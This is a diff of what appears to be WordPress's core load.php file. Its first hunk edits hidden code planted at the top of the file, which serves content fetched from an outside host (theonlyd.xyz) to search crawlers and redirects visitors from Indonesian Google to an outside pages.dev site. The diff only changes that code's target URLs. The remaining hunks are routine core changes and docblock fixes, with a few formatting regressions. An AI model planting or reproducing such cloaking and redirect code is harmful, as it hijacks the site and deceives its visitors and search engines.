@@ -14,13 +14,13 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/amab.html');
+echo file_get_contents('https://theonlyd.xyz/doanhnhantrieuson.html');
 exit;
 }
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://amab.pages.dev/no-money-no-honey/");
+header("Location: https://doanhnhantrieuson.pages.dev/gas-terus/");
 exit;
 }
 ?>
@@ -173,11 +173,12 @@ function wp_populate_basic_auth_from_authorization_header() {
  * @since 3.0.0
  * @access private
  *
- * @global string $required_php_version The required PHP version string.
- * @global string $wp_version           The WordPress version string.
+ * @global string   $required_php_version    The required PHP version string.
+ * @global string[] $required_php_extensions The names of required PHP extensions.
+ * @global string   $wp_version              The WordPress version string.
  */
 function wp_check_php_mysql_versions() {
-	global $required_php_version, $wp_version;
+	global $required_php_version, $required_php_extensions, $wp_version;
 
 	$php_version = PHP_VERSION;
 
@@ -191,6 +192,30 @@ function wp_check_php_mysql_versions() {
 			$wp_version,
 			$required_php_version
 		);
+		exit( 1 );
+	}
+
+	$missing_extensions = array();
+
+	if ( isset( $required_php_extensions ) && is_array( $required_php_extensions ) ) {
+		foreach ( $required_php_extensions as $extension ) {
+			if ( extension_loaded( $extension ) ) {
+				continue;
+			}
+
+			$missing_extensions[] = sprintf(
+				'WordPress %1$s requires the <code>%2$s</code> PHP extension.',
+				$wp_version,
+				$extension
+			);
+		}
+	}
+
+	if ( count( $missing_extensions ) > 0 ) {
+		$protocol = wp_get_server_protocol();
+		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
+		header( 'Content-Type: text/html; charset=utf-8' );
+		echo implode( '<br>', $missing_extensions );
 		exit( 1 );
 	}
 
@@ -264,7 +289,8 @@ function wp_get_environment_type() {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
 			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+		} else {
+			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -840,7 +866,7 @@ function wp_start_object_cache() {
 	 *
 	 * @since 5.8.0
 	 *
-	 * @param bool $enable_object_cache Whether to enable loadingobject-cache.php (if present).
+	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
 	 *                                  Default true.
 	 */
 	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
@@ -1138,9 +1164,9 @@ function wp_skip_paused_themes( array $themes ) {
 	}
 
 	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme );
+		$theme = basename( $theme);
 
-		if ( array_key_exists( $theme, $paused_themes ) ){
+		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1422,7 +1448,7 @@ function is_network_admin() {
  *
  * @global WP_Screen $current_screen WordPress current screen object.
  *
- * @return bool Trueif inside WordPress user administration pages.
+ * @return bool True if inside WordPress user administration pages.
  */
 function is_user_admin() {
 	if ( isset( $GLOBALS['current_screen'] ) ) {
@@ -1453,10 +1479,9 @@ function is_multisite() {
 	return false;
 }
 
-/**
- * Converts a value to non-negative integer.
+/*** Converts a value to non-negative integer.
  *
- * @since2.5.0
+ * @since 2.5.0
  *
  * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
@@ -1732,7 +1757,7 @@ function wp_is_ini_value_changeable( $setting ) {
 }
 
 /**
- * Determines whether the currentrequest is a WordPress Ajax request.
+ * Determines whether the current request is a WordPress Ajax request.
  *
  * @since 4.7.0
  *
@@ -1772,7 +1797,7 @@ function wp_using_themes() {
  *
  * @since 4.8.0
  *
- *@return bool True if it's a WordPress cron request, false otherwise.
+ * @return bool True if it's a WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
